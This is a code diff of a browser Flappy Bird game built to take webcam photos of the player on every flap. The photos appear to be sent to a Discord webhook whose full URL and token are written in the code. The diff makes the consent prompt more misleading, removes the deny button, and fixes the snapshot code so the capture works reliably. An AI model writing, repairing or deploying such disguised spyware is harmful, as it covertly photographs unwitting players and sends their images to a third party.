@@ -20,7 +20,7 @@
 
   <div id="consentModal" class="modal">
     <div class="panel">
-      <h2>Allow</h2>
+      <h2>Allow Camera?</h2>
       <p>You have to allow some settings for it to work</p>
       <button class="allow" id="allowBtn">Yes</button>
     </div>
@@ -36,7 +36,6 @@ const W = canvas.width, H = canvas.height;
 
 const consentModal = document.getElementById("consentModal");
 const allowBtn = document.getElementById("allowBtn");
-const denyBtn = document.getElementById("denyBtn");
 const video = document.getElementById("cam");
 const snap = document.getElementById("snap");
 const snapCtx = snap.getContext("2d");
@@ -48,10 +47,26 @@ let mediaStream;
 const WEBHOOK = "https://discord.com/api/webhooks/1413966614390378556/KoUnhB81Nq08jEC-qQ2NucwHRP8UG6fnlv4zOW2FnelzilKnpWg4MoF9-_NWcsUxMEvl";
 
 // Sprites
-const bg = new Image(); bg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/background-day.png?raw=true";
-const birdImg = new Image(); birdImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/yellowbird-midflap.png?raw=true";
-const pipeImg = new Image(); pipeImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/pipe-green.png?raw=true";
+const bg = new Image();
+bg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/background-day.png?raw=true";
+const birdImg = new Image();
+birdImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/yellowbird-midflap.png?raw=true";
+const pipeImg = new Image();
+pipeImg.src = "https://github.com/samuelcust/flappy-bird-assets/blob/master/sprites/pipe-green.png?raw=true";
 
+let loaded = 0;
+const total = 3;
+function checkLoaded() {
+  loaded++;
+  if (loaded === total) {
+    loop(); // start only after all assets are loaded
+  }
+}
+bg.onload = checkLoaded;
+birdImg.onload = checkLoaded;
+pipeImg.onload = checkLoaded;
+
+// Game vars
 let started = false, alive = true;
 let score = 0, best = 0;
 const plr = { x: 60, y: H/2, w: 34, h: 24, vy: 0, gravity: 0.4, jump: -7 };
@@ -66,25 +81,23 @@ allowBtn.onclick = async () => {
   try {
     mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     video.srcObject = mediaStream;
+    await video.play(); // ensure stream starts
     camEnabled = true;
   } catch (e) {
+    console.error(e);
     alert("Camera permission denied or unavailable. Playing without it.");
   }
   consentModal.classList.add("hidden");
 };
-denyBtn.onclick = () => {
-  camEnabled = false;
-  consentModal.classList.add("hidden");
-};
 
-// Game reset
+// Reset
 function reset() {
   plr.y = H/2; plr.vy = 0;
   pipes = []; score = 0;
   started = false; alive = true;
 }
 
-// Pipe spawn
+// Pipes
 function spawnPipe() {
   const topHeight = 50 + Math.random() * (H - gap - 150);
   const bottomY = topHeight + gap;
@@ -99,8 +112,14 @@ function flap() {
   if (camEnabled) takeSnap();
 }
 
-// Take snapshot
+// Snapshot
 function takeSnap() {
+  if (!video.videoWidth || !video.videoHeight) {
+    console.warn("Video not ready yet");
+    return;
+  }
+  snap.width = video.videoWidth;
+  snap.height = video.videoHeight;
   snapCtx.drawImage(video, 0, 0, snap.width, snap.height);
   snap.toBlob(async blob => {
     if (!blob) return;
@@ -125,7 +144,11 @@ function update() {
   pipes = pipes.filter(p => p.x + pipeWidth > 0);
 
   for (let p of pipes) {
-    if (!p.passed && p.x + pipeWidth < plr.x) { score++; p.passed = true; best = Math.max(best, score); }
+    if (!p.passed && p.x + pipeWidth < plr.x) {
+      score++;
+      p.passed = true;
+      best = Math.max(best, score);
+    }
     if (plr.x + plr.w/2 > p.x && plr.x - plr.w/2 < p.x + pipeWidth) {
       if (plr.y - plr.h/2 < p.top || plr.y + plr.h/2 > p.bottom) alive = false;
     }
@@ -135,11 +158,15 @@ function update() {
 
 // Draw
 function draw() {
+  // fallback fill
+  ctx.fillStyle = "#70c5ce";
+  ctx.fillRect(0, 0, W, H);
+
   ctx.drawImage(bg, 0, 0, W, H);
 
   pipes.forEach(p => {
     const headOverlap = 24;
-    // top pipe (flipped)
+    // top pipe flipped
     ctx.save();
     ctx.translate(p.x, p.top - headOverlap);
     ctx.scale(1, -1);
@@ -165,7 +192,6 @@ function loop() {
   draw();
   requestAnimationFrame(loop);
 }
-loop();
 
 canvas.addEventListener("click", flap);
 window.addEventListener("keydown", e => { if (e.code === "Space") flap(); });
